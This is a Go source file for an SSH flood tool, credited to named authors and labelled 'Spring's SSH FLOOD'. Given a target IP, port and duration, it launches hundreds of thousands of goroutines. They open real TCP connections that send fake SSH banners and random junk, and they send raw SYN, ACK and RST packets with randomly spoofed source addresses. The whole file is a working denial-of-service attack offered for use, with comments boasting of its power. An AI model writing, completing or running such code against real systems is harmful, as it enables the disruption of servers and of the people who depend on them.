// ⚠️ CREDITS TO SPRING / CRUNCHY / ! MENUDO FOR MAKING THIS .....

package main

import (
        "context"
        "encoding/binary"
        "fmt"
        "math/rand"
        "net"
        "os"
        "strconv"
        "sync/atomic"
        "syscall"
        "time"
)

var banners = []string{
    "SSH-2.0-OpenSSH_8.7p1 Ubuntu-7ubuntu2",
    "SSH-2.0-OpenSSH_9.5p1 Debian-1",
    "SSH-2.0-OpenSSH_8.9p1 FreeBSD-2023",
    "SSH-2.0-OpenSSH_7.4p1 CentOS-1",
    "SSH-2.0-OpenSSH_8.4p1 RHEL-8",
    "SSH-2.0-OpenSSH_9.0p1 Alpine-3.17",
    "SSH-2.0-OpenSSH_6.6.1p1 Kali-1",
    "SSH-2.0-Dropbear_2022.83",
    "SSH-2.0-Dropbear_2020.81",
    "SSH-2.0-Dropbear_2019.78",
    "SSH-2.0-Paramiko_3.2.0",
    "SSH-2.0-Paramiko_2.11.0",
    "SSH-2.0-PuTTY_Release_0.79",
    "SSH-2.0-PuTTY_Release_0.76",
    "SSH-2.0-PuTTY_Release_0.74",
    "SSH-2.0-WinSCP_release_6.1",
    "SSH-2.0-WinSCP_release_5.21",
    "SSH-2.0-Bitvise_SSH_Server_8.43",
    "SSH-2.0-Bitvise_SSH_Server_7.33",
    "SSH-2.0-Cisco-1.25",
    "SSH-2.0-JSCH-0.1.54",
    "SSH-2.0-libssh2_1.10.0",
    "SSH-2.0-Syncplify_Server_6.0.18",
    "SSH-2.0-Tectia_SSH_6.4.0",
    "SSH-2.0-Core_SSH_7.5.0",
    "SSH-2.0-BackdoorSSH_666",
    "SSH-2.0-FakeSSH_XYZ_Custom",
    "SSH-2.0-Malicious_SSH_1.0",
    "SSH-2.0-Unknown_SSHD_1.2.3",
    "SSH-2.0-Test_SSH_Server",
    "SSH-2.0-Embedded_SSH_2.0",
    "SSH-2.0-Custom_SSHD_9.9.9",
    "SSH-2.0-RouterOS_6.48",
    "SSH-2.0-Mikrotik_2.2.0",
    "SSH-2.0-Fortinet_5.6.0",
    "SSH-2.0-Juniper_1.0",
    "SSH-2.0-HP_SSH_3.0.0",
    "SSH-2.0-IBM_SSH_2.4.0",
    "SSH-2.0-ESXi_7.0.0",
    "SSH-2.0-QNAP_4.4.0",
    "SSH-2.0-Synology_6.2.0",
    "SSH-2.0-OpenSSH_for_Windows_8.1",
    "SSH-2.0-GitLab_SSH_2.0",
    "SSH-2.0-GitHub_SSH_1.0",
    "SSH-2.0-AWS_SSH_2.0",
    "SSH-2.0-Google_Cloud_SSH",
    "SSH-2.0-Azure_SSH_1.0",
}

var active, total uint64

func main() {
        if len(os.Args) != 5 {
                fmt.Println("Usage: ./ssh ssh <ip> <port> <time>")
                return
        }

        target := os.Args[2]
        port, _ := strconv.Atoi(os.Args[3])
        duration, _ := strconv.Atoi(os.Args[4])
        end := time.Now().Add(time.Duration(duration) * time.Second)

        fmt.Printf("[Spring's SSH FLOOD] Target: %s:%d | Duration: %ds\n", target, port, duration)

        threads := 863221 // The more threads more power.
        for i := 0; i < threads; i++ {
                go mixedFlood(target, port, end)
        }

        for time.Now().Before(end) {
                time.Sleep(5 * time.Second)
                fmt.Printf("[+] Active: %d | Total Packets: %d\n", atomic.LoadUint64(&active), atomic.LoadUint64(&total))
        }
}

func mixedFlood(ip string, port int, end time.Time) {
        modes := []string{"real", "fake", "syn", "ack", "rst"}
        for time.Now().Before(end) {
                mode := modes[rand.Intn(len(modes))]
                switch mode {
                case "real":
                        realSSH(ip, port)
                case "fake":
                        fakeSSH(ip, port)
                default:
                        rawTCP(ip, port, mode)
                }
        }
}

// SSH socket spam w/ connections
func realSSH(ip string, port int) {
        atomic.AddUint64(&active, 1)
        defer atomic.AddUint64(&active, ^uint64(0))

        ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
        defer cancel()

        conn, err := (&net.Dialer{}).DialContext(ctx, "tcp", fmt.Sprintf("%s:%d", ip, port))
        if err != nil {
                return
        }
        defer conn.Close()

        banner := banners[rand.Intn(len(banners))]
        conn.Write([]byte(banner + "\r\n"))

        // Extra handshake noise
        payload := make([]byte, rand.Intn(2048)+512)
        rand.Read(payload)
        conn.Write(payload)

        atomic.AddUint64(&total, 1)
}

// Fake connection spam with junk packets
func fakeSSH(ip string, port int) {
        atomic.AddUint64(&active, 1)
        defer atomic.AddUint64(&active, ^uint64(0))

        conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 2*time.Second)
        if err != nil {
                return
        }
        defer conn.Close()

        banner := banners[rand.Intn(len(banners))]
        conn.Write([]byte(banner + "\r\n"))

        junk := make([]byte, rand.Intn(4096)+2048)
        rand.Read(junk)
        conn.Write(junk)

        atomic.AddUint64(&total, 1)
}

// Raw handle function: tcp, syn, ack, rst
func rawTCP(ip string, port int, mode string) {
        atomic.AddUint64(&active, 1)
        defer atomic.AddUint64(&active, ^uint64(0))

        fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
        if err != nil {
                return
        }
        defer syscall.Close(fd)

        dst := net.ParseIP(ip).To4()
        src := randomIP().To4()

        ipHeader := buildIPHeader(src, dst)
        tcpHeader := buildTCPHeader(src, dst, port, mode)

        packet := append(ipHeader, tcpHeader...)

        syscall.Sendto(fd, packet, 0, &syscall.SockaddrInet4{
                Port: port,
                Addr: [4]byte{dst[0], dst[1], dst[2], dst[3]},
        })

        atomic.AddUint64(&total, 1)
}

// Sends random source ips
func randomIP() net.IP {
        return net.IPv4(byte(rand.Intn(223)+1), byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)))
}

// Simple IPv4 header
func buildIPHeader(src, dst net.IP) []byte {
        ipHeader := make([]byte, 20)
        ipHeader[0] = 0x45
        ipHeader[2] = 40
        ipHeader[8] = 64
        ipHeader[9] = syscall.IPPROTO_TCP
        copy(ipHeader[12:16], src)
        copy(ipHeader[16:20], dst)
        checksum := checksum(ipHeader)
        binary.BigEndian.PutUint16(ipHeader[10:12], checksum)
        return ipHeader
}

// TCP header with mode flags
func buildTCPHeader(src, dst net.IP, port int, mode string) []byte {
        tcpHeader := make([]byte, 20)
        srcPort := uint16(rand.Intn(65535-1024) + 1024)
        binary.BigEndian.PutUint16(tcpHeader[0:2], srcPort)
        binary.BigEndian.PutUint16(tcpHeader[2:4], uint16(port))
        seq := uint32(rand.Intn(1 << 31))
        binary.BigEndian.PutUint32(tcpHeader[4:8], seq)

        flags := uint8(0)
        switch mode {
        case "syn":
                flags = 0x02
        case "ack":
                flags = 0x10
        case "rst":
                flags = 0x04
        }
        tcpHeader[12] = (5 << 4)
        tcpHeader[13] = flags
        binary.BigEndian.PutUint16(tcpHeader[14:16], uint16(rand.Intn(65535)))

        pseudo := pseudoHeader(src, dst, tcpHeader)
        check := checksum(pseudo)
        binary.BigEndian.PutUint16(tcpHeader[16:18], check)
        return tcpHeader
}

// Pseudo-header for TCP checksum
func pseudoHeader(src, dst net.IP, tcp []byte) []byte {
        pseudo := make([]byte, 12+len(tcp))
        copy(pseudo[0:4], src)
        copy(pseudo[4:8], dst)
        pseudo[8] = 0
        pseudo[9] = syscall.IPPROTO_TCP
        binary.BigEndian.PutUint16(pseudo[10:12], uint16(len(tcp)))
        copy(pseudo[12:], tcp)
        return pseudo
}

// RFC checksum
func checksum(data []byte) uint16 {
        sum := uint32(0)
        for i := 0; i < len(data)-1; i += 2 {
                sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
        }
        if len(data)%2 == 1 {
                sum += uint32(data[len(data)-1]) << 8
        }
        for sum>>16 != 0 {
                sum = (sum & 0xFFFF) + (sum >> 16)
        }
        return ^uint16(sum)
}
